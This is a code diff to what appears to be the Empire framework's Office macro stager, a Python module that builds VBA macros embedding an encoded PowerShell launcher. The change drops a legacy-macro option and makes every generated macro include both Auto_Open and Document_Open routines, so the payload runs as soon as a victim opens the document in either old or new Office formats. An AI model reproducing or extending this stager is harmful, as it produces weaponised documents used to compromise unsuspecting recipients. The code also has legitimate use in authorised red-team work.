@@ -9,7 +9,7 @@ class Stager:
 
             'Author': ['@enigma0x3', '@harmj0y'],
 
-            'Description': ('Generates an office macro for Empire.'),
+            'Description': ('Generates an office macro for Empire, compatible with office 97-2003, and 2007 file types.'),
 
             'Comments': [
                 'http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/'
@@ -44,11 +44,6 @@ class Stager:
                 'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                 'Required'      :   False,
                 'Value'         :   'default'
-            },
-            'LegacyMacro' : {
-                'Description'   :   'Generate macro compatible with office 97-2003 documents so a ".xls" extension can be used (True or False).',
-                'Required'      :   True,
-                'Value'         :   'False'
             }
         }
 
@@ -70,7 +65,6 @@ class Stager:
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
-        legacyMacro = self.options['LegacyMacro']['Value']
 
         # generate the launcher code
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
@@ -85,10 +79,10 @@ class Stager:
             for chunk in chunks[1:]:
                 payload += "\tstr = str + \"" + str(chunk) + "\"\n"
 
-            if legacyMacro == 'True':
-                macro = "Sub Auto_Open()\n"
-            else:
-            	macro = "Sub Document_Open()\n"
+            macro = "Sub Auto_Open()\n"
+            macro += "\tDebugging\n"
+            macro += "End Sub\n\n"
+            macro += "Sub Document_Open()\n"
             macro += "\tDebugging\n"
             macro += "End Sub\n\n"
 
